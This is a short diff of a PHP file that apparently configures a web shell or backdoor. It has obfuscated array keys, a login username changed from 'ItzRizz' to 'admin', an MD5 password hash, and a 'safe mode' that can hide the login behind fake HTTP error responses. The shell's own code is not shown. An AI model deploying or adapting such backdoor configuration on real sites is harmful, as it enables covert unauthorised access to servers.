@@ -1,6 +1,6 @@
 <?php
 $GLOBALS['NeUSMyPGXP'] = array(
-	'usmfzmlHFCje' => 'ItzRizz',//login username
+	'usmfzmlHFCje' => 'admin',//login username
 	'paLDRhHfAovu' => 'cd8c5aac2c0099c3d9a70715737f1fe2',//login password (MD5)... ehsan
 	'saEuEgnDlHuL' => '1',//safe mode.. 0 = allow, 1 = deny
 	'logXKTfQPNcx' => 'gui',//safe mode type.. gui = login and HTTP errors accepted: 500, 404, 403
